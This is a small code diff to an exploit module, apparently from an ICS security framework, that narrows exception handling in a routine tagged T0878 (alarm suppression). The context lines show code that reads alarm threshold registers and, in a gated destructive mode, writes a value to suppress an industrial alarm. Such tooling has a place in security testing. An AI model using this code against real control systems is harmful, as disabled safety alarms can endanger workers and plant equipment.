@@ -76,7 +76,7 @@ class Exploit(Exploit):
             resp = sock.recv(64)
             sock.close()
             return len(resp) >= 9 and resp[7] == 0x03
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError, struct.error):
             return False
 
     def run(self) -> None:
@@ -99,7 +99,7 @@ class Exploit(Exploit):
                     vals = [struct.unpack(">H", resp[9+i*2:11+i*2])[0] for i in range(3)]
                     print_success(f"[T0878] Alarm threshold registers {self.address}-{self.address+2}: {vals}")
                     print_warning(f"[T0878] In destructive mode: would write {self.suppress_value} to suppress alarm.")
-            except Exception as exc:
+            except (ConnectionError, TimeoutError, OSError, struct.error) as exc:
                 print_error(f"[T0878] Read error: {exc}")
 
             DestructiveGate.print_simulation(
@@ -127,5 +127,5 @@ class Exploit(Exploit):
                 print_success(f"[T0878] Alarm threshold register {self.address} set to {self.suppress_value}. Alarm suppressed.")
             else:
                 print_error("[T0878] Unexpected response.")
-        except Exception as exc:
+        except (ConnectionError, TimeoutError, OSError, struct.error) as exc:
             print_error(f"[T0878] Error: {exc}")
